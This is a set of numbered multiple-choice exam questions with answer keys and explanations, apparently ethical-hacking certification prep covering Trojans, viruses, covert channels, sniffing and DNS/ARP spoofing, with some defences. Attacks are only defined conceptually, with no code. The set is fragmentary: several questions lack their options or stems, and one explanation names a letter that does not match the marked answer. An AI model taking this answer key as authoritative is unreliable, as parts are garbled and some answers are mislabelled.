> + **Initial Intrusion:** The next phase involves attempting to enter the target network. Common techniques used for an initial intrusion are sending spear-phishing emails and exploiting vulnerabilities on publicly available servers. In this phase, malicious code or malware is deployed into the target system to initiate an outbound connection.

> + Insider Attack: It is an attack performed on a corporate network or on a single computer by an entrusted person (insider) who has authorized access to the network and is aware of the network architecture.

422. Tom, a professional hacker, launched an APT attack on an organization to gather information for a period of time. He was successful in the attack and was able to gather the required information. He is now in the phase of clearing the evidence of compromise.
	Which of the following phases of the APT lifecycle is Tom currently in?
+ [x] Cleanup
+ [ ] Persistence
+ [ ] Search and exfiltration
+ [ ] Expansion
> **Explanation:**
> + Persistence: This phase involves maintaining access to the target system, starting from evading endpoint security devices such as IDS and firewalls, entering into the network, and establishing access to the system, until there is no further use of the data and assets
> + **Cleanup**: This is the last phase, where an attacker performs certain actions to prevent detection and remove evidence of compromise. Techniques used by the attacker to cover his/her tracks include evading detection, eliminating evidence of intrusion, and hiding the target of the attack and attacker details
> + Search and Exfiltration: In this phase, an attacker achieves the ultimate goal of network exploitation, which is generally to gain access to a resource that can be used for performing further attacks or using that resource for financial gain. In general, attackers target specific data or documents before launching an attack
> + Expansion: The primary objectives of this phase are expanding access to the target network and obtaining credentials. If the attacker’s aim is to exploit and gain access to a single system, then there is no need for expansion. However, in most cases, the objective of an attacker is to access multiple systems using a single compromised system

424. Which of the following types of Trojans is used by an attacker to create fake form fields on e-banking pages and collect the target’s account details, credit-card number, and date of birth to impersonate the target and compromise their account?
+ [ ] Form grabber
+ [ ] TAN grabber
+ [x] HTML injection
+ [ ] Covert credential grabber
> **Explanation:**
> The working of a banking Trojan includes the following:
> + TAN Gabber: A Transaction Authentication Number (TAN) is a single-use password for authenticating online banking transactions. Banking Trojans intercept valid TANs entered by users and replace them with random numbers. The bank will reject such invalid random numbers. Subsequently, the attacker misuses the intercepted TAN with the target’s login details.
> + **HTML Injection**: The Trojan creates fake form fields on e-banking pages, thereby enabling the attacker to collect the target’s account details, credit card number, date of birth, etc. The attacker can use this information to impersonate the target and compromise his/her account.
> + Form Grabber: A form grabber is a type of malware that captures a target’s sensitive data such as IDs and passwords, from a web browser form or page. It is an advanced method for collecting the target’s Internet banking information. It analyses POST requests and responses to the victim's browser. It compromises the scramble pad authentication and intercepts the scramble pad input as the user enters his/her Customer Number and Personal Access Code.
> + Covert Credential Grabber: This type of malware remains dormant until the user performs an online financial transaction. It works covertly to replicate itself on the computer and edits the registry entries each time the computer is started. The Trojan also searches the cookie files that had been stored on the computer while browsing financial websites. Once the user attempts to make an online transaction, the Trojan covertly steals the login credentials and transmits them to the hacker.

425. Which of the following techniques is used by an attacker to deploy a Trojan through a legal channel for securely transferring data or information in a company network?
+ [x] Overt channel
+ [ ] Proxy servers
+ [ ] USB/flash drives
+ [ ] Covert channel
> **Explanation:**
> + USB/Flash Drives: An attacker can also transfer the Trojan package onto a USB drive and trick the victim into using the USB drive on the target system. Sometimes, attackers just drop a USB drive and wait for a random victim to pick it up. Once the USB drive is picked up and inserted into the target system by the innocent victim, the Trojan is propagated on the system by the drop or download method, depending on the type of packaging technique used by the attacker.
> + **Overt Channel**: It is a legal channel for the transfer of data or information in a company network, and it works securely to transfer data and information
> + Covert Channel: A channel that transfers information within a computer system or network in a way that violates the security policy. An example of a covert channel is the communication between a Trojan and its command-and-control center
> + Proxy Servers: A Trojan proxy is usually a standalone application that allows remote attackers to use the victim’s computer as a proxy to connect to the target machine. Attackers compromise several computers and start using them as hidden proxy servers.

427. Which of the following types of Trojans intercepts the victim’s account information before the system can encrypt it and sends the intercepted information to the attacker's command-and-control center?
+ [ ] Destructive Trojans
+ [ ] Rootkit Trojans
+ [ ] Backdoor Trojans
+ [x] E-banking Trojans
> **Explanation:**
> + Rootkit Trojans: Rootkits are potent backdoors that specifically attack the root or OS. Unlike backdoors, rootkits cannot be detected by observing services, system task lists, or registries. Rootkits provide full control of the victim OS to the attacker.
> + **E-banking Trojans**: E-banking Trojans are extremely dangerous and have emerged as a significant threat to online banking. They intercept the victim's account information before the system can encrypt it and send it to the attacker's command-and-control center.
> + Backdoor Trojans: A backdoor is a program that can bypass the standard system authentication or conventional system mechanisms such as IDS and firewalls without being detected. In these types of breaches, hackers leverage backdoor programs to access the victim’s computer or network.
> + Destructive Trojans: The sole purpose of a destructive Trojan is to delete files on a target system. Antivirus software may not detect destructive Trojans.

428. A covert channel is a channel that:
+ [ ] Transfers information over, within a computer system, or network that is encrypted.
+ [ ] Transfers information via a communication path within a computer system, or network for transfer of data.
+ [ ] Transfers information over, within a computer system, or network that is within the security policy.
+ [x] Transfers information over, within a computer system, or network that is outside of the security policy.
> **Explanation:**
> + “Overt” refers to something that is explicit, obvious, or evident, whereas “covert” refers to something that is secret, concealed, or hidden. An overt channel is a legal channel for the transfer of data or information in a company network and works securely to transfer data and information. On the other hand, a covert channel is an illegal, hidden path used to transfer data from a network.
> + Covert channels are methods attackers can use to hide data in an undetectable protocol. They rely on a technique called tunneling, which enables one protocol to transmit over the other. Any process or a bit of data can be a covert channel. This makes it an attractive mode of transmission for a Trojan because an attacker can use the covert channel to install a backdoor on the target machine.

429. Which of the following techniques rely on tunneling to transmit one protocol data in another protocol?
+ [ ] Scanning
+ [ ] Asymmetric routing
+ [ ] Steganography
+ [x] Covert channel
> **Explanation:**
> + Scanning: Scanning is the process of gathering additional detailed information about the target by using highly complex and aggressive reconnaissance techniques. Network scanning refers to a set of procedures used for identifying hosts, ports, and services in a network.
> + Steganography: Steganography refers to the art of hiding data “behind” other data without the target’s knowledge. Thus, Steganography hides the existence of the message. It replaces bits of unused data into the usual files such as graphic, sound, text, audio, video, etc. with some other surreptitious bits. The hidden data can be plaintext or ciphertext, or it can be an image.
> + **Covert channel**: Covert channels are methods attackers can use to hide data in an undetectable protocol. They rely on a technique called tunneling, which enables one protocol to transmit over the other. Any process or a bit of data can be a covert channel. This makes it an attractive mode of transmission for a Trojan because an attacker can use the covert channel to install a backdoor on the target machine.
> + Asymmetric routing: It is a routing technique where packets flowing through TCP connections travel through different routes to different directions.

She is enjoying watching the 3D screensaver but whenever the screensaver gets activated, her computer is automatically scanning the network and sending the results to a different IP address on the network. Identify the malware installed along with the 3D screensaver?
+ [ ] Virus
+ [x] Trojan Horse
+ [ ] Beacon
+ [ ] Worm
> **Explanation:**
> + **Trojan Horse:** Trojans get activated upon users’ specific predefined actions like installing a malicious software unintentionally, clicking on the malicious link, etc. and upon activation, it can grant attackers unrestricted access to all data stored on compromised information systems and causing potentially immense damage. A Trojan is wrapped within or attached to a legitimate program, meaning that the program may have functionality that is not apparent to the user. Also, attackers use victims as unwitting intermediaries to attack others.
> + A Trojan Horse is the best answer. It is often disguised as another program. The other answers may seem correct too but since it was in disguise, Trojan Horse is the best answer.
> + Virus: Viruses can attack a target host’s system using a variety of methods. They can attach themselves to programs and transmit themselves to other programs by making use of specific events. Viruses need such events to take place since they cannot self-start, infect hardware, or transmit themselves using non-executable files. “Trigger” and “direct attack” events can cause a virus to activate and infect the target system when the user triggers attachments received through email, Web sites, malicious advertisements, flash cards, pop-ups and so on. The virus can then attack a system’s built-in programs, antivirus software, data files, and system startup settings among others.
> + Worm: Computer worms are standalone malicious programs that replicate, execute, and spread across network connections independently, without human intervention. Intruders design most worms to replicate and spread across a network, thus consuming available computing resources and in turn causing network servers, web servers, and individual computer systems to become overloaded and stop responding. However, some worms also carry a payload to damage the host system.
> + Beacon: It is type of frame transmitted by access points to indicate that it is working and on. These frames are like signals that can be captured by other devices in the wireless networks.

+ [ ] Proxy Server Trojans
> **Explanation:**
> + Remote Access Trojans: Remote access Trojans (RATs) provide attackers with full control over the victim’s system, enabling them to remotely access files, private conversations, accounting data, and others. The RAT acts as a server and listens on a port that is not supposed to be available to Internet attackers.
> + Proxy Server Trojans: Trojan Proxy is usually a standalone application that allows remote attackers to use the victim’s computer as a proxy to connect to the Internet. Proxy server Trojan, when infected, starts a hidden proxy server on the victim’s computer. Attackers use it for anonymous Telnet, ICQ, or IRC to purchase goods using stolen credit cards, as well as other such illegal activities.
> + **Backdoor Trojans**: A backdoor is a program which can bypass the standard system authentication or conventional system mechanism like IDS, firewalls, etc. without being detected. In these types of breaches, hackers leverage backdoor programs to access the victim’s computer or a network. The difference between this type of malware and other types of malware is that the installation of the backdoor is performed without the user’s knowledge. This allows the attack to perform any activity on the infected computer which can include transferring, modifying, corrupting files, installing malicious software, rebooting the machine, etc. without user detection.
> + Covert Channel Trojans: Covert Channel Tunneling Tool (CCTT) Trojan presents various exploitation techniques, creating arbitrary data transfer channels in the data streams authorized by a network access control system. It enables attackers to get an external server shell from within the internal network and vice-versa. It sets a TCP/UDP/HTTP CONNECT|POST channel allowing TCP data streams (SSH, SMTP, POP, etc.) between an external server and a box from within the internal network.

+ [ ] To trick the victim to install the malicious application
+ [ ] To stop the working of security programs such as firewall and IDS
+ [x] To randomly delete files, folders, registry entries, and local and network drives
> **Explanation:**
> The sole purpose of writing destructive Trojans is to delete files on a target system. Antivirus software may not detect destructive Trojans. Once a destructive Trojan infects a computer system, it randomly deletes files, folders, registry entries, and local and network drives often resulting in OS failures.

436. Which of the following is a legal channel for the transfer of data or information in a company network securely?
+ [x] Overt channel
+ [ ] Covert channel
+ [ ] Covert storage channel
+ [ ] Covert timing channel
> **Explanation:**
> + **Overt Channel:** An overt channel is a legal channel for the transfer of data or information in a company network and works securely to transfer data and information.
> + Covert Channel:A covert channel is an illegal, hidden path used to transfer data from a network. Covert channels are methods attackers can use to hide data in an undetectable protocol.
> + Covert Storage Channel/Covert Timing Channel: Covert channels are categorized as covert storage channel and covert timing channel. A covert storage channel transmits information where one program sets the bits and another program reads those bits. That is the information is transmitted in an encoded form. On the other hand the covert timing channel transmits information by modulating or changing some feature of the system behavior over time and the receiving system detects the system behavior and understands the encoded information.

> **Explanation:**
> + **Ransomware:** Ransomware is a type of a malware, which restricts access to the computer system’s files and folders and demands an online ransom payment to the malware creator(s) in order to remove the restrictions. It is generally spread via malicious attachments to email messages, infected software applications, infected disks or compromised websites.
> + Adware: Adware (short for advertising-supported software) is a type of malware that automatically delivers unwanted advertisements in the user interface. Adware produces advertisements in the form of a pop-up or sometimes in an unclosable window.
> + Spyware: Spyware is a stealthy program that records user's interaction with the computer and Internet without the user's knowledge and sends them to the remote attackers. Spyware hides its process, files, and other objects in order to avoid detection and removal.
> + Trojan Horse: It is a program in which the malicious or harmful code is contained inside apparently harmless programming or data in such a way that it can get control and cause damage, such as ruining the file allocation table on your hard disk.

451. Which of the following programs is usually targeted at Microsoft Office products?
+ [ ] Polymorphic virus
+ [ ] Multipart virus
+ [ ] Stealth virus
+ [x] Macro virus
> **Explanation:**

Most macro viruses are written using macro language visual basic for applications (VBA), and they infect templates or convert infected documents into template files while maintaining their appearance of ordinary document files.

452. Which of the following viruses tries to hide from anti-virus programs by actively altering and corrupting the chosen service call interruptions when they are being run?
+ [x] Stealth virus
+ [ ] Polymorphic virus
+ [ ] Cavity virus
+ [ ] Metamorphic virus
> **Explanation:**
> + Cavity virus: Some programs have empty spaces in them. Cavity Virus, also known as a space-filler overwrites a part of the host file that is with a constant (usually nulls), without increasing the length of the file but preserving its functionality. Maintaining constant file size when infecting allows it to avoid detection. The cavity viruses are rarely found due to the unavailability of hosts and due to the code complexity in writing.
> + Polymorphic virus: This type of virus infects a file with an encrypted copy of a polymorphic code already decoded by a decryption module. Polymorphic viruses modify their code for each replication to avoid detection. They accomplish this by changing the encryption module and the instruction sequence. Polymorphic mechanisms use random number generators in their implementation.
> + Metamorphic virus: Metamorphic viruses are programmed in such a way that they rewrite themselves completely each time they infect a new executable file. Such viruses are sophisticated and use metamorphic engines for their execution. Metamorphic code reprograms itself. It is translated into temporary code (a new variant of the same virus but with a different code), and then converted back to the original code.
> + **Stealth virus:** These viruses try to hide from antivirus programs by actively altering and corrupting the service call interrupts while running. The virus code replaces the requests to perform operations with respect to these service call interrupts. These viruses state false information to hide their presence from antivirus programs. For e.g., the stealth virus hides the operations that it modified and gives false representations. Thus, it takes over portions of the target system and hides its virus code.

> + Cluster viruses: Cluster viruses infect files without changing the file or planting additional files. They save the virus code to the hard drive and overwrite the pointer in the directory entry, directing the disk read point to the virus code instead of the actual program.
> + **Sparse infector viruses**: To spread infection, viruses typically attempt to hide from antivirus programs. Sparse infector viruses infect less often and try to minimize the probability of discovery. Sparse infector viruses infect only occasionally upon satisfying certain conditions or only files whose lengths fall within a narrow range.
> + Encryption viruses: Encryption viruses block the access to target machines or provide victims with limited access to the system. This virus uses encryption to hide from virus scanner. It is not possible for the virus scanner to detect the encryption virus using signatures, but it can detect the decrypting module. They penetrate the target system via freeware, shareware, codecs, fake advertisements, torrents, email spam, and so on.
> + Stealth virus: These viruses try to hide from antivirus programs by actively altering and corrupting the service call interrupts while running. The virus code replaces the requests to perform operations with respect to these service call interrupts. These viruses state false information to hide their presence from antivirus programs.

# 08. Sniffing
## Sniffing Concepts
526. Which of the following protocols is used to communicate through port 23 and allows an attacker to login to a network machine remotely via a TCP connection to sniff keystrokes, including usernames and passwords, that are sent in cleartext?
+ [ ] NNTP
+ [ ] HTTP
+ [x] Telnet
+ [ ] POP
> **Explanation:**
> + **Telnet**: Telnet is a protocol used for communicating with a remote host (via port 23) on a network using a command-line terminal. rlogin enables an attacker to log into a network machine remotely via a TCP connection. Neither of these protocols provides encryption; therefore, data traveling between clients connected through any of these protocols are in plaintext and vulnerable to sniffing. Attackers can sniff keystrokes, including usernames and passwords.
> + HTTP: Due to vulnerabilities in the default version of HTTP, websites implementing HTTP transfer user data across the network in plaintext, which attackers can read to steal user credentials.
> + NNTP: Network News Transfer Protocol (NNTP) distributes, inquires into, retrieves, and posts news articles using a reliable stream-based transmission of news among the ARPA-Internet community. However, this protocol fails to encrypt the data, which allows attackers to sniff sensitive information.
> + POP: Post Office Protocol (POP) allows a user’s workstation to access mail from a mailbox server. A user can send mail from the workstation to the mailbox server via SMTP. Attackers can easily sniff the data flowing across a POP network in cleartext because of the protocol’s weak security implementations.

527. In which of the following OSI layers do sniffers operate and perform an initial compromise?
+ [ ] Network layer
+ [ ] Physical layer
+ [ ] Transport layer
+ [x] Data link layer
> **Explanation:**
> The data link layer is the second layer of the OSI model. In this layer, data packets are encoded and decoded into bits. Sniffers operate at the data link layer and can capture packets from this layer. Networking layers in the OSI model are designed to work independently of each other; thus, if a sniffer sniffs data in the data link layer, the upper OSI layers will not be aware of the sniffing.

528. Which of the following techniques is used by a third party to monitor telephone or Internet conversations with covert intentions?
+ [ ] DNS spoofing
+ [ ] VLAN hopping
+ [ ] ARP spoofing
+ [x] Wiretapping
> **Explanation:**
> + DNS spoofing: DNS poisoning, also known as DNS spoofing, the attacker tricks a DNS server into believing that it has received authentic information when, in reality, it has not received any
> + **Wiretapping**: Wiretapping, or telephone tapping, refers to the monitoring of telephone or Internet conversations by a third party with covert intentions.
> + VLAN Hopping: Virtual local area network (VLAN) hopping is a technique used to target network resources present on a VLAN. The main purpose behind a VLAN hopping attack is to gain access to the traffic flowing in other VLANs present in the same network, which is otherwise inaccessible.
> + ARP Spoofing: ARP spoofing involves constructing many forged ARP request and reply packets to overload the switch. The switch is set in “forwarding mode” after the ARP table is flooded with spoofed ARP replies, and attackers can then sniff all the network packets

529. Which of the following techniques is an active wiretapping attack that allows an attacker to monitor and record traffic as well as alter or inject data into the communication or traffic?
+ [ ] Snooping
+ [ ] Spying
+ [x] MITM
+ [ ] Eavesdropping
> **Explanation:**
> + MITM: Active wiretapping is an MITM attack. This allows an attacker to monitor and record the traffic or data flow in a communication system. The attacker can also alter or inject data into communication or traffic.
> + Eavesdropping, Snooping, Spying is Passive wiretapping. This allows an attacker to monitor and record traffic. By observing the recorded traffic flow, the attacker can snoop for a password or other information.

530. What is the TCP/IP-based protocol used for exchanging management information between devices connected to a network?
+ [ ] NNTP
+ [x] SNMP
+ [ ] IMAP
+ [ ] POP
> **Explanation:**
> + IMAP: Internet Message Access Protocol (IMAP) allows a client to access and manipulate electronic mail messages on a server. This protocol offers inadequate security, which allows attackers to obtain data and user credentials in cleartext
> + NNTP: Network News Transfer Protocol (NNTP) distributes, inquires into, retrieves, and posts news articles using a reliable stream-based transmission of news among the ARPA-Internet community. However, this protocol fails to encrypt the data, which allows attackers to sniff sensitive information.
> + POP: Post Office Protocol (POP) allows a user’s workstation to access mail from a mailbox server. A user can send mail from the workstation to the mailbox server via SMTP. Attackers can easily sniff the data flowing across a POP network in cleartext because of the protocol’s weak security implementations
> + **SNMP**: Simple Network Management Protocol (SNMP) is a TCP/IP-based protocol used for exchanging management information between devices connected on a network. The first version of SNMP (SNMPv1) does not offer strong security, which leads to the transfer of data in a cleartext format. Attackers exploit the vulnerabilities in this version to acquire passwords in plaintext

531. Which of the following processes involves monitoring and capturing all data packets passing through a given network using a software application or hardware device?
+ [x] Packet sniffing
+ [ ] Banner grabbing
+ [ ] Proxy chaining
+ [ ] Blind hijacking
> **Explanation:**
> + **Packet Sniffing**: Packet sniffing is the process of monitoring and capturing all data packets passing through a given network using a software application or hardware device. Sniffing is straightforward in hub-based networks, as the traffic on a segment passes through all the hosts associated with that segment. However, most networks today work on switches
> + Banner Grabbing: Banner grabbing, or "OS fingerprinting," is a method used to determine the OS that is running on a remote target system. It is an important scanning method, as the attacker will have a higher probability of success if the OS of the target system is known.
> + Proxy Chaining: Proxy chaining helps an attacker to increase his/her Internet anonymity. Internet anonymity depends on the number of proxies used for fetching the target application; the larger the number of proxy servers used, the greater is the attacker’s anonymity.
> + Blind Hijacking: In blind hijacking, an attacker can inject malicious data or commands into intercepted communications in a TCP session, even if the victim disables source routing.

532. Which of the following protocols is used in the ARPA–Internet community to distribute, inquire into, retrieve, and post news articles through reliable stream-based transmission?
+ [x] NNTP
+ [ ] FTP

550. A tester is attempting to capture and analyze the traffic on a given network and realizes that the network has several switches. What could be used to successfully sniff the traffic on this switched network? (Choose three.)
+ [x] Address resolution protocol (ARP) spoofing
+ [ ] Reverse smurf attack
+ [ ] ARP broadcasting
+ [x] MAC flooding
+ [ ] SYN flooding
+ [x] MAC duplication
> **Explanation:**
> + ARP spoofing is a technique by which an attacker sends ([spoofed](https://en.wikipedia.org/wiki/Spoofing_attack)) ARP messages onto a [local area network](https://en.wikipedia.org/wiki/Local_area_network). In general, the aim is to associate the attacker’s MAC [address](https://en.wikipedia.org/wiki/MAC_address) with the [IP address](https://en.wikipedia.org/wiki/IP_address) of another [host](https://en.wikipedia.org/wiki/Host_(network)), such as the [default gateway](https://en.wikipedia.org/wiki/Default_gateway), causing any traffic meant for that IP address to be sent to the attacker instead.
> + MAC duplication is executed by an attacker by changing the MAC address of their host to match the MAC address of the target host on the network, making the switch forward the target packets to both the host on the network.
> + MAC flooding is a technique employed to compromise the security of the network switches. Switches maintain a list (called a content addressable memory (CAM) table) that maps individual MAC addresses on the network to the physical ports on the switch.

551. Which of the following DNS poisoning techniques uses ARP poisoning against switches to manipulate routing table?
+ [ ] DNS cache poisoning
+ [ ] Proxy server DNS poisoning
+ [x] Intranet DNS spoofing
+ [ ] Internet DNS spoofing
> **Explanation:**
> + DNS poisoning techniques to sniff the DNS traffic of a target network. Using this technique, an attacker can obtain the ID of the DNS request by sniffing and can send a malicious reply to the sender before the actual DNS server.
> DNS poisoning is possible using the following techniques:
> 	+ Intranet DNS spoofing
> 	+ Internet DNS spoofing
> 	+ Proxy server DNS poisoning
> 	+ DNS cache poisoning
> + **Intranet DNS spoofing:** An attacker can perform an intranet DNS spoofing attack on a switched LAN with the help of the ARP poisoning technique. To perform this attack, the attacker must be connected to the LAN and be able to sniff the traffic or packets. An attacker who succeeds in sniffing the ID of the DNS request from the intranet can send a malicious reply to the sender before the actual DNS server.
> + Internet DNS spoofing: Attackers perform Internet DNS spoofing with the help of Trojans when the victim’s system connects to the Internet. It is an MITM attack in which the attacker changes the primary DNS entries of the victim’s computer.
> + Proxy server DNS poisoning: In the proxy server DNS poisoning technique, the attacker sets up a proxy server on the attacker’s system. The attacker also configures a fraudulent DNS and makes its IP address a primary DNS entry in the proxy server.
> + DNS cache poisoning: Attackers target this DNS cache and make changes or add entries to the DNS cache. If the DNS resolver cannot validate that the DNS responses have come from an authoritative source, it will cache the incorrect entries locally and serve them to users who make the same request.

552. A hacker, who posed as a heating and air conditioning specialist, was able to install a sniffer program in a switched environment network. Which attack could have been used by the hacker to sniff all of the packets in the network?
+ [ ] Smurf attack
+ [ ] Fraggle attack
+ [x] MAC flood attack
+ [ ] Teardrop attack
> **Explanation:**
> The correct answer is (b). To sniff all the packets in a network, the attacker can flood the switch with many Ethernet frames, each containing different source MAC addresses. Check whether the switch enters into fail open mode, in which the switch broadcasts data to all ports rather than just to the port intended to receive the data. If this happens, then attackers have the ability to sniff network traffic.

556. During the penetration testing, Marin identified a web application that could be exploited to gain the root shell on the remote machine. The only problem was that in order to do that he would have to know at least one username and password usable in the application. Unfortunately, guessing usernames and brute-forcing passwords did not work. Marin does not want to give up his attempts. Since this web application, was being used by almost all users in the company and was using http protocol, so he decided to use Cain & Abel tool in order to identify at least one username and password. After a few minutes, the first username and password popped-up and he successfully exploited the web application and the physical machine. What type of attack did he use in order to find the username and password to access the web application?

568. In which of the following attacks does an attacker send spoofed router advertisement messages so that all the data packets travel through their system to collect valuable information and launch MITM and DoS attacks?
+ [ ] STP attack
+ [ ] ARP spoofing attack
+ [x] IRDP spoofing
+ [ ] MAC spoofing
> **Explanation:**
> + ARP Spoofing Attack: ARP spoofing is a method of attacking an Ethernet LAN. When a legitimate user initiates a session with another user in the same layer 2 broadcast domain, the switch broadcasts an ARP request using the recipient's IP address, while the sender waits for the recipient to respond with a MAC address. An attacker eavesdropping on this unprotected layer 2 broadcast domain can respond to the broadcast ARP request and replies to the sender by spoofing the intended recipient’s IP address.
> + MAC Spoofing: In this attack, the attacker first retrieves the MAC addresses of clients who are actively associated with the switch port. Then, the attacker spoofs a MAC address with the MAC address of the legitimate client. If the spoofing is successful, then the attacker can receive all the traffic destined for the client. Thus, an attacker can gain access to the network and take over the identity of someone on the network.
> + **IRDP Spoofing**: An attacker can use this to send spoofed router advertisement messages so that all the data packets travel through the attacker’s system. Thus, the attacker can sniff the traffic and collect valuable information from the data packets. Attackers can use IRDP spoofing to launch MITM, DoS, and passive sniffing attacks.
> + STP Attack: If an attacker has access to two switches, he/she introduces a rogue switch in the network with a priority lower than any other switch in the network. This makes the rogue switch the root bridge, thus allowing the attacker to sniff all the traffic flowing in the network.

569. What is the length of ID number of an organization in a MAC address?
+ [ ] 12 bits
+ [ ] 26 bits
+ [ ] 48 bits
+ [x] 24 bits
> **Explanation:**
> A MAC address is 48 bits, which splits into two sections, each containing 24 bits. The first section contains the ID number of the organization that manufactured the adapter and is called the organizationally unique identifier. The next section contains the serial number assigned to the NIC adapter and is called the network interface controller (NIC) specific.

570. What method should be incorporated by a network administrator to prevent the organization’s network against ARP poisoning?
+ [ ] Use secure shell (SSH) encryption
+ [ ] Use SSL for secure traffic
+ [ ] Resolve all DNS queries to local DNS server
+ [x] Implement dynamic arp inspection (DAI) using the dynamic host configuration protocol (DHCP) snooping binding table
> **Explanation:**
> Implementation of DAI prevents poisoning attacks. DAI is a security feature that validates ARP packets in a network. When DAI activates on a VLAN, all ports on the VLAN are considered to be untrusted by default. DAI validates the ARP packets using a DHCP snooping binding table. The DHCP snooping binding table consists of MAC addresses, IP addresses, and VLAN interfaces acquired by listening to DHCP message exchanges. Hence, you must enable DHCP snooping before enabling DAI. Otherwise, establishing a connection between VLAN devices based on ARP is not possible. Consequently, a self-imposed DoS attack might result on any device in that VLAN.

571. Which of the following is a defense technique for MAC spoofing used in switches that restricts the IP traffic on untrusted Layer 2 ports by filtering traffic based on the DHCP snooping binding database?

> Following are the DHCP request/reply messages:
> 
> | DHCPv6 Message      | Description |
> |---------------------|-------------|
> | Release             | Client to server relinquishing the network address and canceling the remaining lease |
> | Decline             | Client to server indicating that the network address is already in use |
> | Reconfigure         | Server to client saying that it has new or updated configuration settings. The client then sends either a renew/reply or Information-request/reply transaction to get the updated information |
> | Information Request | Client to server asking only for local configuration parameters; the client already has the externally configured network address |

573. Which of the following techniques is also a type of network protocol for PNAC that is used to defend against MAC address spoofing and to enforce access control at the point where a user joins the network?
+ [ ] IP source guard
+ [ ] DHCP snooping binding table

574. What happens when a switch CAM table becomes full?
+ [ ] Every packet is dropped and the switch sends out simple network management protocol (SNMP) alerts to the intrusion detection system (IDS) port.
+ [x] The switch then acts as a hub by broadcasting packets to all machines on the network.
+ [ ] The switch replaces outgoing frame switch factory default MAC address of FF:FF:FF:FF:FF:FF.
+ [ ] The CAM overflow table will cause the switch to crash causing denial-of-service (DoS).
> **Explanation:**
> The CAM table contains network information such as MAC addresses available on physical switch ports and associated virtual local area network (VLAN) parameters. The CAM table’s limited size renders it susceptible to attacks from MAC flooding. MAC flooding bombards the switch with fake source MAC addresses until the CAM table is full. Hereafter, the switch broadcasts all incoming traffic to all ports. This changes the behavior of the switch that then works like a hub through which you (the attacker) monitor the frames sent from the victim’s host to another host without any CAM table entry.

575. Ben, a professional hacker, exploited obsolete DNS software on a target organization’s server to inject harmful DNS records into the server’s DNS cache and divert all traffic to his servers.

> + Dictionary Attack: A dictionary file is loaded into the cracking application that runs against user accounts .
> + Chi-square Attack: The chi-square method is based on probability analysis to test whether a given stegoobject and the original data are the same or not.
> + **SAD DNS Attack:** SAD DNS is a new variant of DNS cache poisoning, in which an attacker injects harmful DNS records into a DNS cache to divert all traffic toward their own servers. With this technique, attackers attempt to mislead client browsers to fake websites infected with malicious files, instead of the legitimate website. Attackers exploit side channels; flaws such as dnsmasq, unbound, and BIN in the latest OSes; and obsolete DNS software used to resolve DNS queries to perform SAD DNS attacks.
> + DNS amplification attack: Recursive DNS query is a method of requesting DNS mapping. The query goes through DNS servers recursively until it fails to find the specified domain name to IP address mapping. Attackers exploit recursive DNS queries to perform a DNS amplification attack that results in DDoS attacks on the victim’s DNS server.

576. In one of the following techniques, an attacker must be connected to a LAN to sniff packets, and on successful sniffing, they can send a malicious reply to the sender before the actual DNS server. Which is this technique?
+ [x] Intranet DNS spoofing
+ [ ] Internet DNS spoofing
+ [ ] DNS cache poisoning
+ [ ] Proxy server DNS poisoning
> **Explanation:**
> + Internet DNS Spoofing: Internet DNS poisoning is also known as remote DNS poisoning. Attackers can perform DNS spoofing attacks on a single victim or on multiple victims anywhere in the world. To perform this attack, the attacker sets up a rogue DNS server with a static IP address.
> + Proxy Server DNS Poisoning: In the proxy server DNS poisoning technique, the attacker sets up a proxy server on the attacker’s system. The attacker also configures a fraudulent DNS and makes its IP address a primary DNS entry in the proxy server. The attacker changes the proxy server settings of the victim with the help of a Trojan. The proxy serves as a primary DNS and redirects the victim’s traffic to the fake website, where the attacker can sniff the confidential information of the victim and then redirect the request to the real website.
> + DNS Cache Poisoning: DNS cache poisoning refers to altering or adding forged DNS records in the DNS resolver cache so that a DNS query is redirected to a malicious site. The DNS system uses cache memory to hold the recently resolved domain names.
> + **Intranet DNS Spoofing**: An attacker can perform an intranet DNS spoofing attack on a switched LAN with the help of the ARP poisoning technique. To perform this attack, the attacker must be connected to the LAN and be able to sniff the traffic or packets. An attacker who succeeds in sniffing the ID of the DNS request from the intranet can send a malicious reply to the sender before the actual DNS server.

578. Which of the following techniques enables devices to detect the existence of unidirectional links and disable the affected interfaces in the network, in addition to causing STP topology loops?
+ [x] UDLD
+ [ ] Loop guard
+ [ ] Root guard
+ [ ] BPDU guard
> **Explanation:**
> + BPDU Guard: BPDU guard must be enabled on the ports that should never receive a BPDU from their connected devices. This is used to avoid the transmission of BPDUs on PortFast-enabled ports. This feature helps in preventing potential bridging loops in the network.
> + Root Guard: Root guard protects the root bridge and ensures that it remains as the root in the STP topology. It forces the interfaces to become the designated ports (forwarding ports) to prevent the nearby switches from becoming root switches.
> + **UDLD (Unidirectional Link Detection)**: UDLD enables devices to detect the existence of unidirectional links and further disable the affected interfaces in the network. These unidirectional links in the network can cause STP topology loops.
> + Loop Guard: Loop guard improves the stability of the network by preventing it against the bridging loops. It is generally used to protect against a malfunctioned switch.

When a legitimate user initiates a session with another user in the same layer 2 broadcast domain, the switch broadcasts an ARP request using the recipient's IP address, while the sender waits for the recipient to respond with a MAC address.
> + ARP Poisoning: With the help of ARP poisoning, an attacker can use fake ARP messages to divert all communications between two machines so that all traffic redirects via the attacker’s PC.
> + **ARP Method**: This technique sends a non-broadcast ARP to all the nodes in the network. The node that runs in promiscuous mode on the network will cache the local ARP address. Then, it will broadcast a ping message on the network with the local IP address but a different MAC address. In this case, only the node that has the MAC address (cached earlier) will be able to respond to your broadcast ping request.
> + Ping Method: To detect a sniffer on a network, identify the system on the network running in promiscuous mode. The ping method is useful in detecting a system that runs in promiscuous mode, which in turn helps to detect sniffers installed on the network.

> **Explanation:**
> + **Nmap**: There are many tools, such as the Nmap that are available to use for the detection of promiscuous mode. Nmap’s NSE script allows you to check if a target on a local Ethernet has its network card in promiscuous mode. There is an NSE script for nmap called sniffer-detect.nse which does just that. NAST: - it detects other PC's in promiscuous mode by doing the ARP test.
> + FaceNiff: FaceNiff is an Android app that can sniff and intercept web session profiles over the WiFi connected to the mobile. This app works on rooted android devices. The Wi-Fi connection should be over Open, WEP, WPA-PSK, or WPA2-PSK networks while sniffing the sessions.
> + OmniPeek: OmniPeek network analyzer provides real-time visibility and expert analysis of each part of the target network. This tool will analyze, drill down, and fix performance bottlenecks across multiple network segments. Attackers can use this tool to analyze a network and inspect the packets in the network.
> + shARP: An anti-ARP-spoofing application software that use active and passive scanning methods to detect and remove any ARP-spoofer from the network.

